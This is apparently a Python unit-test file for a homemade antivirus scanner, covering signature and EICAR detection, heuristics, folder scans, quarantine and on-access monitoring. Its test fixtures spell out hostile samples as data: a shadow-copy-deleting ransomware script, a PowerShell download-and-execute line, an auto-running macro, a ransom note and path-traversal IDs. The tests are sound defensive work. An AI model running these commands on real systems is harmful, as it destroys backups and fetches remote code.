import os
import sys
import shutil
import hashlib
import tempfile
import unittest
import zipfile
import io

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import main
import scanner
from scanner import (
    Scanner, MALICIOUS, SUSPICIOUS, quarantine_file, list_quarantine, restore_quarantined,
    delete_quarantined, import_signatures, parse_defender_output, load_hash_file,
)

# Written to disk nowhere: real anti-virus would (correctly) remove it
EICAR = scanner._EICAR


class TestScanner(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.sig = os.path.join(self.dir, "sigs.txt")
        self.scanner = Scanner(signature_files=[self.sig], yara_dir=os.path.join(self.dir, "none"))
        self._log = main.LOG_FILE
        main.LOG_FILE = os.path.join(self.dir, "test.log")

    def tearDown(self):
        main.LOG_FILE = self._log
        shutil.rmtree(self.dir)

    def write(self, name, data):
        path = os.path.join(self.dir, name)
        with open(path, "wb") as f:
            f.write(data)
        return path

    # --- signatures --------------------------------------------------------

    def test_eicar_hash_is_the_published_one(self):
        self.assertEqual(len(EICAR), 68)
        self.assertEqual(hashlib.sha256(EICAR).hexdigest(),
                         "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f")

    def test_detects_eicar_content(self):
        finding = self.scanner.scan_content("eicar.com", EICAR)
        self.assertEqual(finding.verdict, MALICIOUS)
        self.assertEqual(finding.threat, "EICAR-Test-File")

    def test_hash_signature_match(self):
        data = b"pretend this is malware"
        with open(self.sig, "w") as f:
            f.write(f"{hashlib.sha256(data).hexdigest()}  Trojan.Test\n")
        self.scanner.reload()
        path = self.write("tool.bin", data)
        finding = self.scanner.scan_file(path)
        self.assertEqual((finding.verdict, finding.threat), (MALICIOUS, "Trojan.Test"))

    def test_import_signatures(self):
        source = self.write("export.csv", b'"first_seen","sha256"\n"2026-01-01","' + b"a" * 64 + b'"\n')
        self.assertEqual(import_signatures(source, self.sig), 1)
        self.assertEqual(import_signatures(source, self.sig), 0, "duplicates are skipped")
        self.assertIn("a" * 64, load_hash_file(self.sig))

    # --- heuristics --------------------------------------------------------

    def test_clean_files_pass(self):
        self.assertIsNone(self.scanner.scan_content("notes.txt", b"Shopping list: milk, eggs"))
        self.assertIsNone(self.scanner.scan_content("setup.exe", b"MZ" + b"\x00" * 500))
        self.assertIsNone(self.scanner.scan_content("build.ps1", b"Write-Host 'Building project'"))

    def test_double_extension(self):
        finding = self.scanner.scan_content("Invoice_2026.pdf.exe", b"MZ" + b"\x00" * 100)
        self.assertEqual(finding.verdict, MALICIOUS)

    def test_program_disguised_as_document(self):
        finding = self.scanner.scan_content("photo.jpg", b"MZ\x90\x00" + b"\x00" * 100)
        self.assertEqual(finding.verdict, MALICIOUS)

    def test_ransomware_script(self):
        script = b"vssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled No"
        finding = self.scanner.scan_content("cleanup.bat", script)
        self.assertEqual(finding.verdict, MALICIOUS)
        self.assertEqual(finding.threat, "Heur.Ransom")

    def test_download_and_execute_is_suspicious(self):
        script = b"IEX (New-Object Net.WebClient).DownloadString('http://example.test/a')"
        finding = self.scanner.scan_content("update.ps1", script)
        self.assertEqual(finding.verdict, SUSPICIOUS)

    def test_auto_running_macro(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", "<doc/>")
            z.writestr("word/vbaProject.bin", b"Sub AutoOpen()\n Shell \"powershell -c calc\"\nEnd Sub")
        finding = self.scanner.scan_content("report.docm", buf.getvalue())
        self.assertEqual(finding.verdict, MALICIOUS)

    def test_ransom_note(self):
        note = b"Your files have been encrypted! Send 0.1 bitcoin to decrypt them. Contact us via Tor Browser."
        finding = self.scanner.scan_content("HOW_TO_DECRYPT.txt", note)
        self.assertEqual(finding.verdict, MALICIOUS)

    # --- scanning folders ---------------------------------------------------

    def test_scan_folder_reports_findings(self):
        self.write("ok.txt", b"hello")
        bad = self.write("cv.docx.scr", b"MZ" + b"\x00" * 100)
        events, progress = [], []
        result = self.scanner.scan([self.dir], sink=events.append,
                                   progress=lambda d, t, p: progress.append((d, t)))
        self.assertEqual([f.path for f in result["findings"]], [os.path.normpath(bad)])
        self.assertEqual(result["malicious"], 1)
        self.assertTrue(any(e.data for e in events), "findings travel with their events")
        self.assertEqual(progress[-1][0], progress[-1][1])

    def test_scan_can_be_cancelled(self):
        import threading
        stop = threading.Event()
        stop.set()
        result = self.scanner.scan([self.dir], sink=lambda e: None, stop_event=stop)
        self.assertTrue(result["cancelled"])

    def test_parse_defender_output(self):
        output = """Scan starting...
Scan finished.
Scanning C:\\Users\\me\\Downloads found 1 threats.
---------------------------- Threat information ------------------------------
Threat                  : Virus:DOS/EICAR_Test_File
Resources               : 1 total
    file                : C:\\Users\\me\\Downloads\\eicar.com
"""
        findings = parse_defender_output(output)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].threat, "Virus:DOS/EICAR_Test_File")
        self.assertTrue(findings[0].path.endswith("eicar.com"))

    # --- quarantine ---------------------------------------------------------

    def test_quarantine_restore_and_delete(self):
        qdir = os.path.join(self.dir, "q")
        path = self.write("bad.pdf.exe", b"MZ fake program")
        finding = self.scanner.scan_file(path)
        entry = quarantine_file(path, finding, qdir)
        self.assertFalse(os.path.exists(path))
        with open(os.path.join(qdir, entry["id"] + ".qtn"), "rb") as f:
            self.assertNotEqual(f.read()[:2], b"MZ", "quarantined copy is neutralized")
        self.assertEqual([e["id"] for e in list_quarantine(qdir)], [entry["id"]])

        restored = restore_quarantined(entry["id"], qdir)
        with open(restored, "rb") as f:
            self.assertEqual(f.read(), b"MZ fake program")
        self.assertEqual(list_quarantine(qdir), [])

        entry = quarantine_file(restored, finding, qdir)
        delete_quarantined(entry["id"], qdir)
        self.assertEqual(os.listdir(qdir), [])


class TestQuarantineSafety(unittest.TestCase):
    def test_rejects_ids_that_could_escape_the_quarantine(self):
        for bad in ("../../Windows/system32/x", r"..\evil", "", "ABC", None):
            with self.assertRaises(ValueError):
                delete_quarantined(bad, tempfile.gettempdir())
            with self.assertRaises(ValueError):
                restore_quarantined(bad, tempfile.gettempdir())


class TestOnAccess(unittest.TestCase):
    def test_on_access_scanner_reports_new_threats(self):
        import threading
        d = tempfile.mkdtemp()
        log = main.LOG_FILE
        main.LOG_FILE = os.path.join(d, "test.log")
        got = threading.Event()
        events = []
        sink = lambda e: (events.append(e), got.set())
        worker = scanner.OnAccessScanner(Scanner(signature_files=[], yara_dir=d), sink)
        try:
            path = os.path.join(d, "Payment.pdf.exe")
            with open(path, "wb") as f:
                f.write(b"MZ" + b"\x00" * 64)
            worker.submit(path)
            self.assertTrue(got.wait(5), "on-access scanner should report the file")
            self.assertEqual(events[0].level, "critical")
            self.assertEqual(events[0].data["verdict"], MALICIOUS)
        finally:
            worker.stop()
            main.LOG_FILE = log
            shutil.rmtree(d, ignore_errors=True)

    def test_monitor_hands_new_files_to_scanner(self):
        from types import SimpleNamespace
        seen = []
        d = tempfile.mkdtemp()
        try:
            path = os.path.join(d, "new.txt")
            open(path, "w").write("x")
            monitor = main.RealTimeMonitor({}, lambda e: None, root=d, on_file=seen.append)
            monitor.on_created(SimpleNamespace(src_path=path, is_directory=False))
            self.assertEqual(seen, [os.path.normpath(path)])
        finally:
            shutil.rmtree(d)


if __name__ == "__main__":
    unittest.main()
